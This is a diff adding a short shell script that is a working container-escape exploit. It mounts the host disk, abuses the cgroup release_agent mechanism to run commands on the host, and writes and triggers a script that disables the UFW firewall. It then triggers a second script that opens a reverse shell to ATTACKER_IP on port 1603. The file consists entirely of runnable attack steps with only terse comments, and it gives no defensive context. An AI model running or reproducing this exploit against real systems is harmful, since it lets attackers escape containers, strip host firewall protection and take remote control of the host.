@@ -1,0 +1,20 @@
+ls -la /dev | grep disk # As we don't have fdisk, we use this to find drives.
+
+mkdir -p /mnt/host
+mount /dev/xvda2 /mnt/host # Often this would be /dev/sda1. Here we're testing /boot.
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# Disable UFW
+echo '#!/bin/bash' > /cmd
+echo "ufw --force disable" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# Reverse Shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/ATTACKER_IP/1603 0>&1" >> /cmd # or any port which is available to reach from
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
